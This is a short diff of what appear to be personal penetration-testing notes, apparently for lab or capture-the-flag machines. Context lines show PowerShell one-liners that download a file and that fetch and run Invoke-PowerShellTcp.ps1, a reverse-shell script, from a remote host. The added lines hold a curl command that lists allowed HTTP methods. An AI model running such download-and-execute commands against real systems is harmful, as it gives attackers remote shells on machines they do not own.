@@ -9,3 +9,8 @@ powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.37:8000/S
 way 3 ==> download and execute
 
 powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
+
+
+list allowed http methods ==>
+
+curl -v -X OPTIONS http://192.168.1.109
